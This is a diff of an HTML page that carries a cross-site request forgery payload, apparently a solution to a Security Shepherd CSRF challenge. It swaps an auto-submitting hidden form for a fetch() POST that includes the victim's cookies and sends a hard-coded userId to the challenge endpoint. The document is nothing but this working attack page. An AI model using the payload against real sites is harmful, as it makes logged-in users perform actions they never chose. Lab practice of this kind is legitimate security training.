@@ -1,11 +1,15 @@
 <html>
     <body>
-        <form name="csrfForm" action="https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengetwo/plusplus" method="POST">
-<input type="hidden" name="userId" value="ceb75022bc88977c7f9a3b41ac341a47cc99d33d" />
-<input type="submit"/>
-</form>
 <script>
-document.csrfForm.submit();
+    var fd = new FormData();
+    fd.append("userId", "ceb75022bc88977c7f9a3b41ac341a47cc99d33d");
+    fetch('https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengetwo/plusplus', {
+            method: "POST",
+            credentials: "include",
+            mode: "no-cors",
+            body: fd
+        });
+
 </script>
 
     </body>
